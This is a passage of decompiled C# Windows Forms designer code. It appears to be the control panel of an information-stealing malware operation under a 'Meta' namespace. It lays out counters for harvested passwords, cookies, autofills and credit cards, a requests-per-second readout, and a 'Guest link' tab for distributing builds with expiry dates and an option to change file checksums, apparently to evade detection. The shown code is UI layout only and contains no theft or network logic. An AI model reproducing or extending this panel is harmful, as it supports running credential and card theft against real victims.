        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider5).TabIndex = 17;
        ((System.Windows.Forms.Control)this.metroSetDivider5).Text = "metroSetDivider5";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).Thickness = 1;
        ((System.Windows.Forms.Control)this.cardsLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.cardsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cardsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.cardsLbl).Location = new System.Drawing.Point(4, 338);
        ((System.Windows.Forms.Control)this.cardsLbl).Name = "cardsLbl";
        ((System.Windows.Forms.Control)this.cardsLbl).Size = new System.Drawing.Size(99, 21);
        ((System.Windows.Forms.Control)this.cardsLbl).TabIndex = 16;
        ((System.Windows.Forms.Control)this.cardsLbl).Text = "Credit Cards:";
        ((System.Windows.Forms.Label)this.cardsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.creditcardsCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.creditcardsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.creditcardsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.creditcardsCounter).Location = new System.Drawing.Point(103, 337);
        ((System.Windows.Forms.Control)this.creditcardsCounter).Name = "creditcardsCounter";
        ((System.Windows.Forms.Control)this.creditcardsCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.creditcardsCounter).TabIndex = 15;
        ((System.Windows.Forms.Control)this.creditcardsCounter).Text = "0";
        ((System.Windows.Forms.Label)this.creditcardsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.metroSetDivider4).Location = new System.Drawing.Point(-1, 360);
        ((System.Windows.Forms.Control)this.metroSetDivider4).Name = "metroSetDivider4";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider4).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider4).TabIndex = 14;
        ((System.Windows.Forms.Control)this.metroSetDivider4).Text = "metroSetDivider4";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider4).Thickness = 1;
        ((System.Windows.Forms.Control)this.autofillsLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.autofillsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.autofillsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.autofillsLbl).Location = new System.Drawing.Point(4, 279);
        ((System.Windows.Forms.Control)this.autofillsLbl).Name = "autofillsLbl";
        ((System.Windows.Forms.Control)this.autofillsLbl).Size = new System.Drawing.Size(70, 21);
        ((System.Windows.Forms.Control)this.autofillsLbl).TabIndex = 13;
        ((System.Windows.Forms.Control)this.autofillsLbl).Text = "Autofills:";
        ((System.Windows.Forms.Label)this.autofillsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.autofillsCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.autofillsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.autofillsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.autofillsCounter).Location = new System.Drawing.Point(103, 277);
        ((System.Windows.Forms.Control)this.autofillsCounter).Name = "autofillsCounter";
        ((System.Windows.Forms.Control)this.autofillsCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.autofillsCounter).TabIndex = 12;
        ((System.Windows.Forms.Control)this.autofillsCounter).Text = "0";
        ((System.Windows.Forms.Label)this.autofillsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.metroSetDivider3).Location = new System.Drawing.Point(-1, 300);
        ((System.Windows.Forms.Control)this.metroSetDivider3).Name = "metroSetDivider3";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider3).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider3).TabIndex = 11;
        ((System.Windows.Forms.Control)this.metroSetDivider3).Text = "metroSetDivider3";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider3).Thickness = 1;
        ((System.Windows.Forms.Control)this.cookiesLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.cookiesLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cookiesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.cookiesLbl).Location = new System.Drawing.Point(4, 219);
        ((System.Windows.Forms.Control)this.cookiesLbl).Name = "cookiesLbl";
        ((System.Windows.Forms.Control)this.cookiesLbl).Size = new System.Drawing.Size(68, 21);
        ((System.Windows.Forms.Control)this.cookiesLbl).TabIndex = 10;
        ((System.Windows.Forms.Control)this.cookiesLbl).Text = "Cookies:";
        ((System.Windows.Forms.Label)this.cookiesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
        ((System.Windows.Forms.Control)this.cookiesCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.cookiesCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.cookiesCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.cookiesCounter).Location = new System.Drawing.Point(103, 218);
        ((System.Windows.Forms.Control)this.cookiesCounter).Name = "cookiesCounter";
        ((System.Windows.Forms.Control)this.cookiesCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.cookiesCounter).TabIndex = 9;
        ((System.Windows.Forms.Control)this.cookiesCounter).Text = "0";
        ((System.Windows.Forms.Label)this.cookiesCounter).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
        ((System.Windows.Forms.Control)this.metroSetDivider2).Location = new System.Drawing.Point(-1, 240);
        ((System.Windows.Forms.Control)this.metroSetDivider2).Name = "metroSetDivider2";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider2).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider2).TabIndex = 8;
        ((System.Windows.Forms.Control)this.metroSetDivider2).Text = "metroSetDivider2";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider2).Thickness = 1;
        ((System.Windows.Forms.Control)this.passwordsLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.passwordsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.passwordsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.passwordsLbl).Location = new System.Drawing.Point(4, 159);
        ((System.Windows.Forms.Control)this.passwordsLbl).Name = "passwordsLbl";
        ((System.Windows.Forms.Control)this.passwordsLbl).Size = new System.Drawing.Size(87, 21);
        ((System.Windows.Forms.Control)this.passwordsLbl).TabIndex = 7;
        ((System.Windows.Forms.Control)this.passwordsLbl).Text = "Passwords:";
        ((System.Windows.Forms.Label)this.passwordsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.passwordsCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.passwordsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.passwordsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.passwordsCounter).Location = new System.Drawing.Point(103, 158);
        ((System.Windows.Forms.Control)this.passwordsCounter).Name = "passwordsCounter";
        ((System.Windows.Forms.Control)this.passwordsCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.passwordsCounter).TabIndex = 6;
        ((System.Windows.Forms.Control)this.passwordsCounter).Text = "0";
        ((System.Windows.Forms.Label)this.passwordsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.metroSetDivider1).Location = new System.Drawing.Point(-1, 180);
        ((System.Windows.Forms.Control)this.metroSetDivider1).Name = "metroSetDivider1";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider1).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider1).TabIndex = 3;
        ((System.Windows.Forms.Control)this.metroSetDivider1).Text = "metroSetDivider1";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider1).Thickness = 1;
        ((System.Windows.Forms.Control)this.label56).AutoSize = true;
        ((System.Windows.Forms.Control)this.label56).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label56).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label56).Location = new System.Drawing.Point(4, 38);
        ((System.Windows.Forms.Control)this.label56).Name = "label56";
        ((System.Windows.Forms.Control)this.label56).Size = new System.Drawing.Size(131, 21);
        ((System.Windows.Forms.Control)this.label56).TabIndex = 40;
        ((System.Windows.Forms.Control)this.label56).Text = "Requests Per Sec:";
        ((System.Windows.Forms.Label)this.label56).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.guestLinkTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.changeMd5Cb);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.label36);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.createDirectFileBtn);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.guestFilesDgv);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider16);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.guestExpireDate);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.label58);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.guestBuildID);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.label60);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.addGuest);
        ((System.Windows.Forms.Control)this.guestLinkTab).Controls.Add((System.Windows.Forms.Control)this.guestLinksDgv);
        ((System.Windows.Forms.Control)this.guestLinkTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.guestLinkTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.guestLinkTab).Name = "guestLinkTab";
        ((System.Windows.Forms.Control)this.guestLinkTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.guestLinkTab).TabIndex = 25;
        ((System.Windows.Forms.Control)this.guestLinkTab).Text = "Guest link";
        ((System.Windows.Forms.Control)this.changeMd5Cb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.changeMd5Cb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.changeMd5Cb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.changeMd5Cb).Location = new System.Drawing.Point(548, 608);
        ((System.Windows.Forms.Control)this.changeMd5Cb).Name = "changeMd5Cb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.changeMd5Cb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).StyleManager = null;
        ((System.Windows.Forms.Control)this.changeMd5Cb).TabIndex = 155;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.changeMd5Cb).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.label36).AutoSize = true;
        ((System.Windows.Forms.Control)this.label36).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label36).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label36).Location = new System.Drawing.Point(441, 608);
        ((System.Windows.Forms.Control)this.label36).Name = "label36";
        ((System.Windows.Forms.Control)this.label36).Size = new System.Drawing.Size(108, 15);
        ((System.Windows.Forms.Control)this.label36).TabIndex = 154;
        ((System.Windows.Forms.Control)this.label36).Text = "Change checksum:";
        ((System.Windows.Forms.Control)this.createDirectFileBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).FlatAppearance.BorderSize = 0;
        ((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.createDirectFileBtn).ForeColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Location = new System.Drawing.Point(573, 603);
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Name = "createDirectFileBtn";
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Size = new System.Drawing.Size(79, 26);
        ((System.Windows.Forms.Control)this.createDirectFileBtn).TabIndex = 153;
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Text = "Create Link";
        ((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).UseVisualStyleBackColor = false;
        ((System.Windows.Forms.Control)this.createDirectFileBtn).Click += new System.EventHandler(createDirectFileBtn_Click);
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToAddRows = false;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToDeleteRows = false;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToResizeColumns = false;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToResizeRows = false;
        dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).AutoGenerateColumns = false;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
        dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle7.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle7.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle7.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1, (System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn);
        ((System.Windows.Forms.Control)this.guestFilesDgv).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.c1;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).DataSource = this.object_18;
        dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle8.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle8.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle8.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle8.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).DefaultCellStyle = dataGridViewCellStyle8;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).EnableHeadersVisualStyles = false;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.Control)this.guestFilesDgv).Location = new System.Drawing.Point(319, 338);
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).MultiSelect = false;
        ((System.Windows.Forms.Control)this.guestFilesDgv).Name = "guestFilesDgv";
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ReadOnly = true;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
        dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle9.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle9.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle9.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle9.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle10.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowsDefaultCellStyle = dataGridViewCellStyle10;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        ((System.Windows.Forms.DataGridView)this.guestFilesDgv).ShowEditingIcon = false;
        ((System.Windows.Forms.Control)this.guestFilesDgv).Size = new System.Drawing.Size(501, 259);
        ((System.Windows.Forms.Control)this.guestFilesDgv).TabIndex = 152;
        ((System.Windows.Forms.Control)this.guestFilesDgv).DoubleClick += new System.EventHandler(guestFilesDgv_DoubleClick);
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).DataPropertyName = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).HeaderText = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).Name = "iDDataGridViewTextBoxColumn1";
        ((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn1).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).DataPropertyName = "Filename";
        ((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).HeaderText = "Filename";
        ((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).Name = "filenameDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.filenameDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn).Width = 250;
        ((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).DataPropertyName = "ChangeMd5";
        ((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).HeaderText = "ChangeMd5";
        ((System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn).Name = "changeMd5DataGridViewCheckBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.changeMd5DataGridViewCheckBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.BindingSource)this.object_18).DataSource = typeof(Meta.SharedModels.GuestFile);
        ((System.Windows.Forms.Control)this.metroSetDivider16).Location = new System.Drawing.Point(117, 328);
        ((System.Windows.Forms.Control)this.metroSetDivider16).Name = "metroSetDivider16";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider16).Size = new System.Drawing.Size(934, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider16).TabIndex = 151;
        ((System.Windows.Forms.Control)this.metroSetDivider16).Text = "metroSetDivider16";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider16).Thickness = 1;
        ((GuiLib.AnimaTextBox)this.guestExpireDate).Dark = false;
        ((System.Windows.Forms.Control)this.guestExpireDate).Location = new System.Drawing.Point(476, 267);
        ((GuiLib.AnimaTextBox)this.guestExpireDate).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.guestExpireDate).MultiLine = false;
        ((System.Windows.Forms.Control)this.guestExpireDate).Name = "guestExpireDate";
        ((GuiLib.AnimaTextBox)this.guestExpireDate).Numeric = false;
        ((GuiLib.AnimaTextBox)this.guestExpireDate).ReadOnly = false;
        ((System.Windows.Forms.Control)this.guestExpireDate).Size = new System.Drawing.Size(265, 23);
        ((System.Windows.Forms.Control)this.guestExpireDate).TabIndex = 150;
        ((GuiLib.AnimaTextBox)this.guestExpireDate).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label58).AutoSize = true;
        ((System.Windows.Forms.Control)this.label58).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label58).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label58).Location = new System.Drawing.Point(369, 271);
        ((System.Windows.Forms.Control)this.label58).Name = "label58";
        ((System.Windows.Forms.Control)this.label58).Size = new System.Drawing.Size(100, 15);
        ((System.Windows.Forms.Control)this.label58).TabIndex = 149;
        ((System.Windows.Forms.Control)this.label58).Text = "Expires DateTime:";
        ((GuiLib.AnimaTextBox)this.guestBuildID).Dark = false;
